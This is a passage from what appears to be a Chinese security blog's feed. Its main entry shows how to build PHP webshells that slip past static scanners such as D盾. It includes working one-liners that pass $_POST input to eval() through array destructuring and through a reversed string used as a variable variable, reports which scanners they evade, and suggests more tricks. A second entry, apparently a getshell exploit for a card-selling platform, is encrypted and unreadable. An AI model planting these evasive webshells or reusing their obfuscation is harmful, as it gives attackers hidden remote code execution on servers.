plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">function a()&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&quot;shell&quot;&#x3D;&gt;&#39;a&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&quot;c&quot;&#x3D;&gt;$_POST[&#39;h3art3ars&#39;],</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">[&quot;shell&quot;&#x3D;&gt;$c,&quot;c&quot;&#x3D;&gt;$b]&#x3D;$a;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">  return  $b;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">eval(a());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p><img src="/images/webshell-10.png" alt="webshell-0219193523997"></p><p>成功过D，测试可用性。</p><p><img src="/images/webshell-11.png" alt="webshell-0219193554027"></p><h2 id="支持为负的字符串偏移量"><a href="#支持为负的字符串偏移量" class="headerlink" title="支持为负的字符串偏移量"></a>支持为负的字符串偏移量</h2><p>官方说明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">现在所有支持偏移量的字符串操作函数 都支持接受负数作为偏移量，包括通过[]或&#123;&#125;操作字符串下标。在这种情况下，一个负数的偏移量会被理解为一个从字符串结尾开始的偏移量。</span></pre></td></tr></table></figure><p>这个在小于7.1版本中，负的偏移量返回空字串。</p><p>eg：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&quot;h3art3ars&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">var_dump($a[-1]);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>7.1.x中返回 <code>s</code>，但是以前的版本中 返回 <code>string(0) &quot;&quot;</code></p><p>思路：</p><p>我们可以这个拆分字符串，使规则识别不出来。最后再配合php的可变变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;?php</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">$a&#x3D;&quot;TSOP_&quot;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">$b&#x3D;$a[-1].$a[-2].$a[-3].$a[-4].$a[-5];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">$c&#x3D;$&#123;&quot;$b&quot;&#125;[&#39;h3art3ars&#39;];</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">eval($c);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">?&gt;</span></pre></td></tr></table></figure><p>这样就可以过某d0g了。但是对于D盾来说，会识别拼接字符，和可变变量。报一级<code>可疑文件</code>，不得不说这点做的确实很好。</p><h1 id="尾"><a href="#尾" class="headerlink" title="尾"></a>尾</h1><p>其实还有很多特性，就像<code>通过define()定义常量数组</code>，也都可以举一反三去绕过。而且不止自定义函数，还可以配合类，可变变量等，来绕过静态查杀。</p><p>还可以利用 <code>太空船操作符（组合比较符）</code>，<code>整数除法函数 intdiv()</code>等来绕过动态查杀。</p><p>这里给D哥的规则库又能添加几条了。哈哈。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p> <a href="https://www.php.net/manual/zh/migration71.new-features.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration71.new-features.php</a> </p><p> <a href="https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations" target="_blank" rel="noopener">https://www.php.net/manual/zh/migration70.new-features.php#migration70.new-features.return-type-declarations</a> </p>]]></content>
    
    <summary type="html">
    
      webshell绕过静态查杀的特殊方法
    
    </summary>
    
    
      <category term="技巧" scheme="http://h3art3ars.github.io/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="bypass" scheme="http://h3art3ars.github.io/tags/bypass/"/>
    
      <category term="技巧" scheme="http://h3art3ars.github.io/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="webshell" scheme="http://h3art3ars.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>伯乐发卡发卡平台getshell</title>
    <link href="http://h3art3ars.github.io/2020/02/25/%E4%BC%AF%E4%B9%90%E5%8F%91%E5%8D%A1%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/"/>
    <id>http://h3art3ars.github.io/2020/02/25/%E4%BC%AF%E4%B9%90%E5%8F%91%E5%8D%A1%E5%8F%91%E5%8D%A1%E5%B9%B3%E5%8F%B0getshell/</id>
    <published>2020-02-25T02:15:05.000Z</published>
    <updated>2020-02-25T02:16:54.375Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">伯乐发卡平台getshell漏洞</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="327b8249c250ce37687a8f5e0edb7b24a78e4dfd5eca35118e37b4e7bcc1a18e">0c5efe6d8b28e68e33ca13f137eea13f60225973d9a9c8a24071e0957c2ed34b879dcfd29e8d84d8bad769cba1cd0e76c95be5d6d7694821a807c08b58e9564515e0201f2d8d2d6702fd441993810c588f288b3fd2af4c24f7436ff17d4b141c9e1397f44c9fc3c14c64897570b773b4542602099e8dcba90d98be686a2a4de8c36d57b613c0fbabc0e55d79d55b2c5bf3b706ad5f44203090b379c6f4c449363221c04c2e0451862e15bfde4c2f60082167a4fc9bd6bc2a52d0c7769c5884b62a96b98bdddea92ac03edc66739554e5b2b0b668426af256e1872006b77bac513ea75e4abc37edfabed069d978a2b3c22d0313195f3751aab704d00c2bb9b43f21e31ec88b06e9c32af94fd697d6d9b4d7ffc18e5b10992a94f72aed6b984349b343131163d895705ba27c3c58965caf690541c7e074143fd6c5ba99278209421505124c8d4c488741ff125b0e472db4fbadfae7414f8eb5e7d6c84a52fcd8ea76148c806de72a9e54a0da076160449eddc3f41f6c55700130ffcc595421a9e7e27d07e821bc010cd0b0d30eec46f3e6112ebfee36ee05e14b3abae5469f3fe3f45f6a9f91f1ed103547c6a1f8915bd4f8708c43ad2ff769b7e1c83160ef17bbf9ea1c2c3dbda56109f2d89c91854ecca7d0f544090fdee116d1202f302ef74866f56d5b54cdcf6b272c31358addefd73c254160f85d126ae58aca0a11fa5e1a0d0d293362e13ffe72d9f030c3f6d0f808f09cc52a93d96b8639eb20b8fede6f4c4a5902205b7ce69988d9ce415cf943cf132f049eb3cd1e55fa9defffd66a2692c12dbc37d683466e2f56b8b952e49847821409b05128709cec2fa078133f7c209d072e954051d6741bfbd9c1ec0cfce1dc5ae69f99cfdccdda99924506c390d728f78f5b261fe0bae2503e11fe9cb716d22ef85ed50fe7a849c482e497def573403b3e58698ff3196706c5dff61d07e5db11d78beecf319f6c0273cbc63db50232211b1cd31e86bf2436aa113656796a8d5444140ae36bebf2a6cb01a3b05c5aa5c23ff2aab45f4e9c4add257ab4651428f754b02960e2dbb7d39bd208303c5c478e0f43968b9adb40ee8aa72bf180cfb92b0aa163945fe41643fad952bd04b31b01a164f0fce3af58f5cd3e45ecfaaf7bd64e7cb8b4fdfbc1a41afd61c67f6c165bfc5f9aee5e7cd7426e77f814d95a129d275ff28d65d609759ab93d76550309238638c883ed87e64f70ecc820314a892f6b0d05342bff1d0e52e2966e4dec297ba321641a0cb1895fe08cc1af060e413004763ad12679e13af82e4bb5825bdf2551553bba0f138eafa1c5b8e8f2ef2ecf26c29bbdb116b73329c247f763ceb79ac8e95db7a4e55f6aad82fbb24215e14d6c2c4deab380b1fdff7cee72510103737751292418d8572b002ae2a4a08af3a5a343e86efebb5644352a455c4decd2250b8aa32fae99d71573ece9d874402992ea5b6374fe8388df34871006a151912bbccf8245ddcb928e28fc6c4617bd2ad03365760508d1d1f31f01dd54e75e1b9553300c025b2d7d5a0af460422192263d93d4383de52fa727b1fe11a1e2871d4136ab3636f1d5dc91d52700dc17b5d047b09f2bee0ad91d05825ea0633492bce73ec448a1bdd7fa024a8dcb438259e64e0ada958281cdbda67bdbb32af7d642914dc686353e2ade81e9e3fb77a4bd790c47438d6c8d93d7d43183b45f9ee88137c20270b6dafaa223178ead6efe4a911b4b713aab23f9325cc162a0785ae530df131fce21545425f0f6b7d10050b1c1e80e3367caa33df0d2d3a526098762d0fa1e32e094758789a762391346bfaaadfcff049a36bcb7cbc0456670694f5b7394cb942e7ea03300f7ed628b54467f0912559de433e61a1152963eec930915efc2bcc45bebd83ce20afd7892e4abe5c37eefb97d4812114553db46c8e41e065de435fe8447a4cec0e9d88ecc94b7dbab21dad393f5f952ddddbe39c8383ef42eb362a68935f5e9eafbfdc60dbc799cc2356cc2580343fb4765986a797e55396b67a77eed2566a8459552355eb82d98cc42accbcf8fbf5dae790d82b484cb327454928cbdeaf29c092c146ae92e7fe4e8253bcfdcd762202d50e87d8a1df3e6f582a77eca2251fdaff22674b17a385144c617da6cccd60c05ceb20688ecee798aaf0428a94828c2a77159368d95b69d50d111979d9375a933715221ed714ca0b0f53226b66cbb2e91adc2575ea31cd034850a795fb8e074830f2dd24cb9a9831012dfd61e47f68b4c2983fed93be137653eb398c68a3de4cab17699218271e0e5324bf7cb8c30edd54a445789a3fe4e4a7490836039be8508cb568a3044383aa52e1846b647edbc8c809ec80932be3517de8e2117a883098f1ca09dd0757fcbde728397e216aa25cebdbbe8e63e3717259a1587dad4be66d84b10902b50d08f36f9c01b3ba78e9fc23dc6a55d550064abefc90c52ed9dfa5d388213b6db52de83192170a5dc59f5e0d0ccd7e4dd29fd81aeabb6ee5a53061fc594ca9d0eb556589d7f4b376d2430d39c4da641f4b57f20da7df771515f6091186463560a72a988714234fefff0f8c9ed93587436415151dbd769952b464c686fee4d7ef1fdeb8ec6e711d189502377413d0f522fe4557ee0412c7f4a488316aea86c66b761025d8436da7cab16c683d448353f3ebd78a22e8d64e109acd1b86d0c6cc3c997a5882e5ad5193dac805af31fca84efb75ec02b8cd977e6dded9747b6146957388f6440ea6e485b15593228d7e267a98b0f82cabf00f12635e399723f6104af43cdbc334139532569d1a92db9c4ea60f1d5d9bc5161c8e3da3442931366e3fbb37524f0f52fdda81853878b320fd06588dc624e3059266d5673e8baf4f07965a5fb176d950380c2d2f1b40307589c295c004ce9298a00806ae82eaf97c7769f93c8a0662bf90778ade69ae9d0aa2a67365f8ef39d84d8897c436330357ad73f09e86dec2ad1a73f2d310cad32e9a0ebb7c6dbf12f6a18b5d2da6e0571ecd41883006defc866f935d3828e0dd6f4cc215ebea8f43ccbdc0b19cadbc497cffd20f517db35e7835208f62dc11f1fb840f90466dcb0cbaace1dcd642f11f6a574cce534fb864081fcf11529ae7d1562d953faf4e8aed9abeeb5df244e3e46beabcaf5be964bb0e1dcdb07526a03659ff2902b577eccc25182436bf28c94d4732fda46d61c355dca7a78f2cdc83b41b39a09e4116fc078440de087ee259a4f9228cedcca4f462b847a3ee2fef0eade6c61a071fd75ee624393cbb08a3dc5c3a3d4cd79dd5cb566352aa11dcd99277bd72c4c0e441ae2893289c77ebf023fc6bad64a6cb8420735339f76fcf515eb25b782587228629e58026a37a16eff637eb12f4120a4074828009652cdee124262ace3aaf16127e025a716436f800c5473d709c645610a3ea029523da70c0a5e82687f429d8bec9b47034e5e74f546ad734348370fc263fb363531449e7207a034505e46cc409ca721f66907510081c4b5b3d5060fc752d868577465f1fe1becac2fdc3056618dc05aa51617fdea4c9d37924ff7c0478c5b8a3e261d875080f05e42ad432b6771e2b516c50bec80c21a778da7dd576af412aec653540f2e55b067bec5a3e5f5af7bb47d4fa6a1a9bc644d27c4c82cd5e833cdd1789898dd07bb1cda1be2690511ee875ea0a825b50674ff10ac3b6b39cf08c456afb5c3447aefc8405a1b65648c94f972c55b17ce2a774c18c5c7690f3338b090569fc32d223f278e1564280769634adba2a8db7c30726f59cf8aab8463b1b7ccf48585330eff4625d066c8663eb68ca0396c8c8eb4cda96865b186b097ee20bf5b631731ac762fc61cd42c9dc2e536bfb28772393bcdcb86124be571a16ca357341f4735e4f3d11376504420e3a57cde3c72d61bc605f5589a10d046beb67fcebdecc831c9e52942415dd4e44889f0863b38b9c0393395c9b099bee452c8c67e805f2d9a91cd0ceffedb3b6f6c40facb3c8ecdeba8eb7c78562525bf3789011c9976ba42943e582c7d08628be5617d768cfee8a39a159f0026036a91fc30b7cd6a9658065b78e8fa1c2b51a978f87d0bbf578407a1ca353311650da2e62ccebbe7e6457912808c405c29d510c31368cc3c09913dbacfbdd79f49ace3c998e136bd331505390ec52ba4c20e9d9a78318535573ac2030e28ba3cc6155481c1c1976838adfa40b9fc913fd39be730877c719daa1ee22f3e89777abf10c32cf2d5703cae2d155a9a5012ad7dbbde99583b2cfa5adde22ad9dc24853ed40fcb1f6299d93d005d022c66567c760178fc7048f4bf7d66f69e3802155c0b15b39a918a649dbdda2e8ca1c3fb4893e95976888eb78f7b353761adc7bf87644400086c489ea6f1ad05547e8d4d0a347b0464a5746b72501019143a8f2206edb5c979ef091918785b0c8cb187b9dc3870c4a6bad3d7a0511da23db21a5d4065f8415706c09593cd60e9e3bb26eea0c5168e75bf8d3eb36393aa50bd154b1d6bcffc52d81a95e6d8ddc78c1ac2e4f4d637523c358c62729f272829c3ee89aee85e2e9219857379d3978113031c29c87740b47f7ce320c7f2f0c1f4f25c26407dcba4556cf1a53e444e09a0e6673a58d69ceec64a8713377eea96507636e5633cd1411a28cf10d50dd63cdd13bdf15759f024aed939d2d4981d933ff556f0318fc730eab3a7f488501a01bd6d229269f3c6f5b4928f1f8b1339a3d92c869cba8332bb43dd412c4fc6087b2ca592ab479b033ed3b07dc5865970582ea27bf0af934138796dd5302acd2d5199de078ab03aec944177060a7674e5109f9981c2d96b270eafca316c7ad7e41531c25ae460259627f1af2f8483353565be800ef625caa5cd9952eacfb7a946456500686ccd266812ba9bb1c02f3b30123f29ef6aa64cdfc285d939cdd7c1bab52563841776c139615b9cbbf48dcb04fd324d27f1bd8ca973b4d9d1f1c2c44714a41f46b777573d13b632dbfe84b05401f6015dc8482aac779b549d07c8ca1f56d5d7f80654a19cd4d8550c1e0ce8e30b5e4a42a06fefa8c2f43a279a429176e5a517b19897facf9f353a556b3ecf71ca56cd628c9ed1e7b8ac18602b79fc20a7b74e03942c02cc2d0051a838576ad5e617a070bc45de005852473556b49d4f51bdb4e452f701ba4c17b557c22afceee86c904fad7a64fc708589623b83b8e4ee238b74b0e8e14a405cfe5fdaece8127dd2a88bc7d2afc5c2a9a095d6a5408c47e91edb867b56d4b1041ed8f5f608706bb0975509747ece80d5b3a827b0a70f34baefad84d578d1b051108c6c5cdd4ae695e94d9a162bb3b232d5961bd12992fd9024a651df632cf94563e37f763138395f6e18fed42029e5f8f56b66013388e3b6c1aaecca4183fff9914aee94a61be062daa17ebb62795780115f77ba54ad27a3f5b75ba81baadcbadf48e461de3ea221f60db851e139beea005866f739b90a1c6c973010bd88c9a147732643f5deae8ec78b8e59919b60cda437c3f72b0c443bbb0f564a7b2f54988ce269e6e15d1dfc8689863425cc64d6b2c867d64379001c9a0abce4d34ebf4a091261434161deadda402a25ba8c85488179edcca705b33b4106e81630c2b5f6fdb02e49aa87a907f7d0d3b5e8c03a361e6daf55c78eddc52560c3bc3c84220f08f7412f6d985d8d8472f9f5b52ae56ec3ac9d1d5352a99b4e6a88ae0566ae60da7cc0928d4d3ed622a2ff38c53c1a4c0c4b43e16c8e28a273298bb5bed207b6f9a8eba0da98fced1601fbd766489c132235556eec8f954720bf7ee27580dddec7a27c390649043bc7241e47751eec5b908f27c4de3f36a89da5b57c0155f9e33f96a5afbcc129d2d4c69ae5997b112733946283ba5363fed90e4146cca0ac70babfe9b3b7d5b74d444239805dc4c6120dfb29637af4ad139803558e73cf608312c99c799d767bc0c383503ead7f0be75e758e512f2458df3a154725108a60f9051079e45e9ebcae5cc2e449f324280b61e3fea57e77cfcaf996f4d41cf2a4d8f90ea2635e7c7b6a0cbf234048ea4a25b351657430041fcf0007adf324a7e4f71a44e4efdef3f9fec49bc346c42a68afcdd943c1f991326e2de98c5ba4bb2b647e33e7353a59f2d91ef7299473c420893f135b28af2960097b238a6540dcb84a46f1f4a8492eba60f7b23c967d66c75f7e93fa0e7d1042b44a94153340a30f0674852d04c075d945b09bff72084dac51add61c70e277f5feff706d8f6fd12876852792e5fc601f53876881591c9336f046a4bd771c8bbb9e23faed949ca15407cecb462958b55440df707f0c2c99bd33776aa8042c9b971b9d65db0f50ce761be8df6480942832bf1083a68c0bd48af799b40e446d295b5cc04e661b91e69dfd24bed33abd9e2108d254ebec42e881cd0f7a0bf5f2bc9158e1cf090c4b1d900af6b224be81bbdbfa925551b938d6ba70f4768a500b14c00f2d359c9aeb0b8ca3856942d4710d1363abc23eb4d048f8a770b9d8699d2bb33bf1e9dbbaf62a5add8462adf95514612762ed07050c1d0b858920d6c1b0265da54516db4e676cfeeb114f02b886a2bf83d4181770fe0a9be8b41e07c52b00bd4fd5a43085ac8c5482f7391ac95df3780e6100d7910829904313dbd495d7753c35de09cedf3a6b6b8850c2ff3647069517f5345c8ed8104c9cabf8db4d348219e3ea09bc8cc818bd0342fd035fc9263b8c128d7457c3db0ff7cbd06c8b6805443a3489072d33d50bf6bebe8291f9440c4fdb9fecf4be4aa129f9820515fe0fb41c24014ffe084fe628d5930caac64919cf29195d98a5487caa8f2fff7f35a04ef211ec26e2e4ce158d74dd51a803adf30c53cac64a05cb6fbe083f4699f89869f151ddadf09537a71d69256036a1a815ecc296682148ed16284571723fb549a6c7849dd0618f4bec162259199383a93a1a88dcd984f760904e76410036f9b1e606389a49f62de59d1cacfde59fbe04bf301b9608f6bf50a30e280c9167235bcd27d6e7eeeb6bace16b06ce0504060aac10b10d38cf46ff17638b4fed11d17812838434bc6e0e4adc1446987475239473b223c5d13843af17382060cce782c5195919277bbab04005c12ea3970c9cebea5b7a86b065ad0f47b4e574fca863427103b61f4e9723783a61f5fbae82005a66f1b0f761566b363886fb80e6b159dbe7ce55417f459c235ac9ba7964632e2be7aec668430045d73f3be15d11d57586cfc5a44e7e88ad98f115b55748f76c446d07e763b91e77bf8e84ce808a90d82d5f65c7a57a9a8390008e7498f0e90ad990ead860bf138696de5a363468f27c39f7aa5f7b92e69b60309ab5e9100235e44c3f0615daaea7b8d32c1f5bfd00283730b8594ab8aabcd838d99c5a4944805a8ae96b78612994773f3873c25a712b7b1b1dd4df6df525d6a076d3210660ee10095a7a2a13559c144ea44680468648dcc59b8092d3f6524a9a81dbf162f68954a86b04d73ce4f4f32d6c72e608b3dd3107f1de87b0a5811e060cb37b785701a0ce1c85520a3e982c0f133628871ef2a540e52f3c0776ddbbcebc997eea0f3483246f3eadaed7f37158127e61e1278cd0aca106f09d27cefd5e70003122e35a7a860fe8bb4b9499d30d732681599f11448c2a3e34e678d9152b63faac424d34c8c73e11f244b90d5c684d458eb8ef685aaf054b9581bf18948bed6f4cda2c2b1cd050b4aaab49d260c77ef060c5f2382242e4bce3c755baa2b4fcc960afff9c32e202eb2152ae7e7d801bba7864b0fa857f2a0f8feba6a322c1fafdad35303e77cf8f77c77624850643cc2dc51e375134bf0088f793b1d712bbe668d606039b164db1aa24acc51d8201cb20fc3bad475069eee86c8408bc714fcfe62139c329df96320067bbca279df67c27bf18adabfe9b8ea6852f64d5f30931db4ef7cfe66415cb2ca4f31c5d4406294f2dc2a266cd340049a464b210a022bc97d7ce12f693f0bbbec8c142b561e09aed0875669400c2e045a275edeed2577c20791c04e6236437a7a34598a186da8ceed12ac6b9e900eb21dc692b2b54f4d0fa9cd88c3c48975b72d003d3e31f9fd29b1fb9098ab52b0b5308536e94015c22c0ad6b90e2b892ffc513b997ae39c1257642d6ee7ecaba8ff59887793b2290acc09f5acaf0029c69f36075d594bd1cccd9e95ab1a152ee2c7e32ea32d29663a2923c459a9bc37f25fa765aba177fc454de59e1aa0258cbc68770d31adbe13eef15a7372a2056a54a29c0b56f5dac2eddce34d6c625a64e5029e4700730cda4e660113747050be2f96e1e626161edffe438f912e4de82877d97cde687949c9eabb57fe571b0aa225b15e56513815a24b76eba267480bef2d86c79f6005c713b8317489f67f78543b97f658a3edefa8386843cf1b7bf96c8be221530d47832fcd723a1f0d9d0565b815c803237c5a238674ea185ceb4c9878d2b968be833102b30408e59e3fd94e76bcd8a91ebdb41fed7b3806a62e8b01867e4f953cebbf72b9edf5d0471348a5cb3a3a66051485d0d151b1e99b2b91e7e618b21d6c5f33f5d72faadb70adfb5daef3c3a216e65e6b3d3138e647799c6e1c50deaacb2a041aaa71868efff68f80a89264a0bdabb830a95032b3a55b3eba4711862169bfd26571966a72d8859ee226fc846d2e28c1c4e3016f77598957c0855d54246035c458be96d915624df25c82b8f3539e4878c6df1a3a0f83b0e7de1e3bbac70470eb4969c8ebb119919154a753a0c7d668d2e3e84eb42a21d9758852ab5b53e778550088e56df2c157094408659aff06310c9ff5df6dc2cd296ff025b841727c3921bf43155691181e28dd92fe8bf6baa578662613101602b8a2392d40b447a10e201bf5ea166c5c761396ecd19be0deff25988834fe6132cd874d4272e502f2bf2e0733820788c10d4aa4da68fab74c71a15d76f0e62d636c7aefac760315b53fa35b9b90af21943cff6e5fd5b92eda5498061584e87c53c306b3fad459d0dc9b442489629d6e3222b604bfd8ec4cd13183d2e98a4c5b7a6ba9f8bead06c39c782f02c0c36c46a215a7df4a4e2d543a8b8335d08864a3e8daf3485663a7bf21f9876b04b6f3bb4fc25daefb56f8cd817894182248ec8f67275ef8275898d9fb2c0b8f95f37f30a380e494232d7c99f4ddb7d29c934fe1c718a4a2edbff4837bc39391440a1e2639bdaacffeebdf27e44e6cd8b0ec0bc873b743b44d54bb5de7c5bca75ca4c47902b3bdde4f3187e032761fc83c3024c767b1cdfb6f10993a960e2f0f27cd85803b5431f4068f74f1ac1e9090f4e455822343ddb458a6155669efb68a2de2c4785012e741d833a1a4e53344978e9496ee8f5cdd48c3631b1723c161ef1752e00697f48b53eb42f2998282c7fc4796ea947e3bf3dbb6015dac3d3880bf1e1829057c0223f77abe8bea143348df97b9f24356c394724960bfee569ee26da5250d3c9bf12381e1823ef83a2a5b2252c33712a8a1f1b8abf65dfed82a8e061c5e3bf7887fbf27f4667402de21541baa0421827d27f9a39c8e219e3f066ba8a33302edc6f8a48466ebba9e16639892effbf694a25240f93b98816fc4ed532a2ab82710cdb1044e7b301de10b60428441c58dd0f1d8d96fb047681754305117d422860dd2fd7af4eca5cb7733241cb752fc78561553406006c54c95b1fae4ede86f1699c75c093c40dd0701b6dc1919ba14ffc9c095ca46fadbf208b8ada2b24503e76c0ac3a880f589ae078c79179b2193e095f5b22ee39b7e36a57dfa1b74865780a428e617f9ed6039f60d2535da903b846ab7edd27312afe06d58c01c270661cb88b0a6c5c05da825797295b869609a7c1c349d6fe0d1f9a9fcd126c691c12ca8c76f864368f6accc2c8a114d148115ffdbfd9a60565e97f1bebe559aa36884aeb54f8d56369f36059ac6fdb7cb4d1b0fad0185f772c07f791a4f7923fc27755e5e37d1a00d3e26fcdaee4064f8c656431e4116eafdd5961e9a1126aa0b82d9ba6de196b44f80602464f49b5389c27b38bb8e8b1660255fbece3ef98cf8b3c6cb408130bf1b65c8eae9121d0c31e49b067d4d204b129e9fcec5a660886bf11b0e605702125975bfc6f75134572eee81ff73beb7fa1bd53451f7b5b4566228159c4a2718f04b33f350075bbe99777b8d387914abc4235663d24f49313e9c65577a407cf6152edd08373ed017d63ab971bd9160113766c130e69e9cdcddecdf1c25b4f4d57600852e52f2008a67a7de8b2ddb2e353e4afe7afed954cd86e0969f8b4919ef093c4ac883cbaa7579913c882618ad4f578de342cd57e7f1e5e6015c82240eab67796b7d0f0df887c072235779593fc21ca24bbf56a9633a515c9d1bd30aa35570f0d1885929916f727808ab807b9f157c2c2951cee31932aa54428dfacc44bb7c438244314fd5511d56f03e25f7e25f06240e6ab0ec893036e09e1dc9a8d5b11b10cd4a9eef46f6625b622bd6239836dd632502cd3c1650d3bc33d47d7f92827ae6aea092d91055d0a71b223be7466f78489b97102f9e1502dbeec7f3342876c754add2696cb26bd78733f8afe3dc6eb42f7eca307d3eb909a903d214a8897fdf94ceb517f6c56890097fff2af64282671cdf18f396f470a699b96e94b86c4635fc5b3590b68ffad222734e9b23dd49628ec7dc75ff15fa6044e263e7f11d37ff421743124b999a6f837c6c160ca9776c0b43562ed93d12e349b3b7ef74c75229c521e0f827245a94b82275123c5bd5a00eb29f79a3c861dcd18f2e65bcd5217733a240a3b5687c41915126dbc571888dbaef928ff29b78b438bc45c273c629c15f6ec72905aa041408bbb2e1e56ee34881dd176670b7b6a9034d7fb175699796cd79609dafb3cffb559065c1b26f63f6dfa10554c98d98510bfae30e134e83fc61e7f0f65c4c5f940d88eb5401b94d607455f4f2dedbd5ec93762834be2dbfa81b1c5f48d7e1697f8de411471b0d9f3d90e351a8b95ac69ac938590ee13f792109eb7745c5de038349cef094318291fe889014f8f7e2a4ecd547ba141eab171626437b7d17e9ef73c093a53accc2bd5fff95c34d13234c7ca49960b0346e4c610df6101327aa38321a482f464ad82a7958275a577c4a05c39640dce3611ffd7866baaa85c905660850cf3230857691a382addcda711e8f500a8715abba7ced89b6673d5366d2d3d7934ab42d8be79eaa8f7714ff5f9a13fbc8676f8e84b5453de3430ad95e396cb1aa68269504d4d1e509b68ea520c3198a8beabb5131dc92a8a37f421f1f7a41ffc9b8c320ab907a399eaa4cc33331b8e752cdba0afe7498945198509074cce12e92ed67e90904c5fa3e68d83d1abca7f04f6bb7dc4b5748187002fd61a477e537c89c994893c0f99e83f7ab0833e07a5974f2f269894a2764e23d473703b29f0146d2ac9b73c48df9b1e57ceb88e13f9bb13deb26a782bf836293069c6a5ede0400358bd4d9df511d4aba3668e70ef2bad8863f499940f56ae6afe97f2d88f5ebf10f5113207352094cb45f532640fb5a171437b18174f5fbdf51e1f076b269833c66d2876ad34edbdadd16361f5504769aa734315716e385eceed8e2d9e83da90f68ef7935a24ecc9a2a820ecb6668a0ec10c8e99a3e3a0fefc020b1b81d9b0066372a55f98e1857797add6aaeab575bbc7f69338c08a3fea372643ed238d7240822eb97da32404b183eedf10e9fcfcfe9ed72bf1e322e18921f08ec04dec1a8720e39269201179b52f60c0ebd7d1ec83add6b78bfd3c570823d789d28b02f5434ab3e878b0c19856bbbb012d14a05fa7b180d3046026af14f1e7e715140ecd43de910eac63d88cd7d33f710855ee645cbe60b65b757804ec5a15955ef5110560066950002135e9d1181b2fa23f12a2849a0aec02b5affc09841dc7c4d4bf1b44787bc3368446b2b7da688e86016354572fadb3909df5390490ee60c4de9da41acbc640c85f8c71b1ea88bf3dc833b96bea18fa65eb55eed298a8dce8c0f2a6d5fb4c4a134b7d7ebbad9f7461ead5c5fe3f814bad8fe84c40fbfdaa5789660beb7bfa91fc98cef7bd03d9a9d57281cc538a8226f7cbcc1a8573f88c425f610fede15e396888f0ea810fb722fb33d481e1dac54a304b12e7842c67a3fcbdc11287449f1356e225c094b08f98c9f49b4ef5d00b780cb5b89544dbb12860891e02083c0991751a081f12278424a3cea535bc2c059a14d39072178ebf20b5e0f1af438c159ecc16cc7ea2943976aa98ca301043ad3c7c200015daed1f73b6291da0b53ab1cff7f34e08fa665b0678cea52eaa62c8790e3039c3c92999a7785bfb140196fa47e65d3604a8ccc9d5941206b49522da58fb8705b8c145adb854ad5eddb4d9585742685211e7d20eb7bf13adc9a42c12cfbfa28135b7c858181f3cab0d7791d2c48c2871c2a3cf719fb2857c6ae67bedcc6a1d44522ac8215bb1746b69a42475231e0c7481a3fe4d1b49358ff90f91ca6f0c282227f386bcf20daac4c1d7c858fe127bcb5be1792319dcd5f98f85a64f83bcaaf00a1fa6a241889f9fc54a7751da1ece3ab8d2432166845b6371b6f1df4cf92799c5802464bdeaa052e5f336f816862b78511c7970d01b0e6784560961d79401704aa9335b7731dcb484de8b4b576f523bc97f285124165223392fef3b25f072d457f1388e9640939b8a01416cb30ed4f3987e764e4708d09046a4969d5c552e3b158f0384a34c55c98823e5d60b43e9f65050447d82a326f9e60a9c0258fb2f6beed17ecd2f407e6c887fbef3877834f8f63f76ecdae66aa7dcc30c67cbe6b43a9e8f3dd0f010d097db0c76f702db66657468a0d7295fffa57a7aab1607e70648ed83eef5f0cd8cdb484724376455950f066d530d0375715c450c209499df8965fbd184cb9a44d53e31e752ff50c075825e04ae13d8e079c7d5f5147e26bb2b600c3396dfdbcc90ed809bfe83f82db5a833bdc7335966687be